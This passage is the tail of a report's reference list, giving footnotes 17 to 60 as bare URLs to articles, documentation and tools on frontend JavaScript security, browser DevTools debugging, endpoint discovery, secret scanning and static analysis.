[^17]: [https://writeups.io/summaries/detailed-technical-analysis-of-cve-2024-4367-arbitrary-js-execution-in-pdfjs/](https://writeups.io/summaries/detailed-technical-analysis-of-cve-2024-4367-arbitrary-js-execution-in-pdfjs/)
    
[^18]: [https://www.geeksforgeeks.org/blogs/top-common-frontend-security-attacks/](https://www.geeksforgeeks.org/blogs/top-common-frontend-security-attacks/)
    
[^19]: [https://www.reflectiz.com/blog/javascript-security-2023/](https://www.reflectiz.com/blog/javascript-security-2023/)
    
[^20]: [https://dev.to/chaudharidevam/7-frontend-security-vulnerabilities-you-should-know-and-fix-22hi](https://dev.to/chaudharidevam/7-frontend-security-vulnerabilities-you-should-know-and-fix-22hi)
    
[^21]: [https://snyk.io/articles/javascript-security/](https://snyk.io/articles/javascript-security/)
    
[^22]: [https://www.ibm.com/docs/pt/SSB2MG_4.6.1/com.ibm.ips.doc/concepts/wap_client_side_attacks.htm](https://www.ibm.com/docs/pt/SSB2MG_4.6.1/com.ibm.ips.doc/concepts/wap_client_side_attacks.htm)
    
[^23]: [https://www.opswat.com/blog/comprehensive-analysis-of-cve-2024-6778-race-condition-vulnerability-in-chrome-devtools](https://www.opswat.com/blog/comprehensive-analysis-of-cve-2024-6778-race-condition-vulnerability-in-chrome-devtools)
    
[^24]: [https://blog.pixelfreestudio.com/learning-from-security-vulnerabilities-in-frontend-code/](https://blog.pixelfreestudio.com/learning-from-security-vulnerabilities-in-frontend-code/)
    
[^25]: [https://owasp.org/www-project-top-10-client-side-security-risks/](https://owasp.org/www-project-top-10-client-side-security-risks/)
    
[^26]: [https://dl.acm.org/doi/10.1145/3656394](https://dl.acm.org/doi/10.1145/3656394)
    
[^27]: [https://blog.bitsrc.io/top-7-common-frontend-security-attacks-2e2b56dc2bcc](https://blog.bitsrc.io/top-7-common-frontend-security-attacks-2e2b56dc2bcc)
    
[^28]: [https://www.geeksforgeeks.org/ethical-hacking/types-of-client-side-attacks/](https://www.geeksforgeeks.org/ethical-hacking/types-of-client-side-attacks/)
    
[^29]: [https://javascript.plainenglish.io/analysis-of-vulnerabilities-identified-in-javascript-between-2022-2025-f8553d010467](https://javascript.plainenglish.io/analysis-of-vulnerabilities-identified-in-javascript-between-2022-2025-f8553d010467)
    
[^30]: [https://www.recordedfuture.com/threat-intelligence-101/vulnerability-management-threat-hunting/front-end-security](https://www.recordedfuture.com/threat-intelligence-101/vulnerability-management-threat-hunting/front-end-security)
    
[^31]: [https://tryhoverify.com/blog/chrome-devtools-javascript-debugging-guide/](https://tryhoverify.com/blog/chrome-devtools-javascript-debugging-guide/)
    
[^32]: [https://bugbustersunited.com/unraveling-web-complexity-with-linkfinder/](https://bugbustersunited.com/unraveling-web-complexity-with-linkfinder/)
    
[^33]: [https://learn.microsoft.com/en-us/microsoft-edge/devtools/javascript/](https://learn.microsoft.com/en-us/microsoft-edge/devtools/javascript/)
    
[^34]: [https://developer.chrome.com/docs/devtools/javascript](https://developer.chrome.com/docs/devtools/javascript)
    
[^35]: [https://github.com/GerbenJavado/LinkFinder](https://github.com/GerbenJavado/LinkFinder)
    
[^36]: [https://www.linkedin.com/posts/shaikarifali_jsleak-is-a-tool-to-find-secret-paths-or-activity-7075840269396443136-UHRB](https://www.linkedin.com/posts/shaikarifali_jsleak-is-a-tool-to-find-secret-paths-or-activity-7075840269396443136-UHRB)
    
[^37]: [https://developer.chrome.com/docs/devtools/javascript/reference](https://developer.chrome.com/docs/devtools/javascript/reference)
    
[^38]: [https://www.yeswehack.com/learn-bug-bounty/discover-map-hidden-endpoints-parameters](https://www.yeswehack.com/learn-bug-bounty/discover-map-hidden-endpoints-parameters)
    
[^39]: [https://www.jit.io/resources/appsec-tools/the-developers-guide-to-using-gitleaks-to-detect-hardcoded-secrets](https://www.jit.io/resources/appsec-tools/the-developers-guide-to-using-gitleaks-to-detect-hardcoded-secrets)
    
[^40]: [https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Debugging_JavaScript](https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Debugging_JavaScript)
    
[^41]: [https://cybersectools.com/tools/linkfinder](https://cybersectools.com/tools/linkfinder)
    
[^42]: [https://gitleaks.io](https://gitleaks.io)
    
[^43]: [https://dev.to/hanzla-baig/debugging-javascript-like-a-pro-mastering-browser-devtools-nodejs-85g](https://dev.to/hanzla-baig/debugging-javascript-like-a-pro-mastering-browser-devtools-nodejs-85g)
    
[^44]: [https://infosecwriteups.com/js-link-finder-burp-suite-extension-guide-e4809a6da268](https://infosecwriteups.com/js-link-finder-burp-suite-extension-guide-e4809a6da268)
    
[^45]: [https://www.aikido.dev/blog/top-secret-scanning-tools](https://www.aikido.dev/blog/top-secret-scanning-tools)
    
[^46]: [https://www.qodo.ai/blog/best-static-code-analysis-tools/](https://www.qodo.ai/blog/best-static-code-analysis-tools/)
    
[^47]: [https://www.softwaretestingmagazine.com/tools/open-source-javascript-code-analysis/](https://www.softwaretestingmagazine.com/tools/open-source-javascript-code-analysis/)
    
[^48]: [https://armur.ai/blogs/posts/top_20_static_analysis_tools/](https://armur.ai/blogs/posts/top_20_static_analysis_tools/)
    
[^49]: [https://projectdiscovery.io/blog/nuclei-templates-v9-8-0-a-leap-forward-in-network-security-scanning](https://projectdiscovery.io/blog/nuclei-templates-v9-8-0-a-leap-forward-in-network-security-scanning)
    
[^50]: [https://developer.chrome.com/docs/devtools/overrides](https://developer.chrome.com/docs/devtools/overrides)
    
[^51]: [https://snappify.com/blog/code-analysis-tools](https://snappify.com/blog/code-analysis-tools)
    
[^52]: [https://github.com/projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
    
[^53]: [https://learn.microsoft.com/en-us/microsoft-edge/devtools/javascript/overrides](https://learn.microsoft.com/en-us/microsoft-edge/devtools/javascript/overrides)
    
[^54]: [https://spectralops.io/blog/top-10-static-application-security-testing-sast-tools-in-2025/](https://spectralops.io/blog/top-10-static-application-security-testing-sast-tools-in-2025/)
    
[^55]: [https://github.com/projectdiscovery/nuclei-templates/releases](https://github.com/projectdiscovery/nuclei-templates/releases)
    
[^56]: [https://javascript.plainenglish.io/chromes-best-debugging-feature-301de685a616](https://javascript.plainenglish.io/chromes-best-debugging-feature-301de685a616)
    
[^57]: [https://daily.dev/es/blog/6-best-elixir-static-analysis-tools-2024](https://daily.dev/es/blog/6-best-elixir-static-analysis-tools-2024)
    
[^58]: [https://projectdiscovery.io/blog/nuclei-templates-monthly-may-2025](https://projectdiscovery.io/blog/nuclei-templates-monthly-may-2025)
    
[^59]: [https://www.youtube.com/watch?v=PT6xsr_AUQ0](https://www.youtube.com/watch?v=PT6xsr_AUQ0)
    
[^60]: [https://www.reddit.com/r/devops/comments/1fd2twc/what_are_the_best_static_analysis_tools_for/](https://www.reddit.com/r/devops/comments/1fd2twc/what_are_the_best_static_analysis_tools_for/)
